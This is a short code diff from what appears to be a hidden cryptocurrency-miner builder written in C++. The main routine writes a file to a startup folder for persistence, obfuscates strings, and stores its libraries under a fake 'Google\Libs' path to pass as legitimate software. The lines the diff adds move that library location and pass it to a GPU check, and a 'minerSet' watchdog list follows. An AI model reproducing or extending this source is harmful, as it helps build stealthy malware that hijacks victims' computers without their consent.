@@ -16,7 +16,12 @@ int wmain(int argc, wchar_t* argv[])
     SHGetFolderPathW(NULL, $BASEDIR, NULL, 0, startupPath);
     wcscat(startupPath, AYW_OBFUSCATE(L"#STARTUPFILE"));
 
-    bool hasGPU = has_gpu();
+    wchar_t libPath[MAX_PATH] = { 0 };
+    SHGetFolderPathW(NULL, $CPPLIBSROOT, NULL, 0, libPath);
+    wcscat(libPath, AYW_OBFUSCATE(L"\\Google\\Libs\\"));
+
+    bool hasGPU = has_gpu(libPath);
+
     wchar_t* minerSet[][2] = { $WATCHDOGSET };
 
     ULONG fileSize;
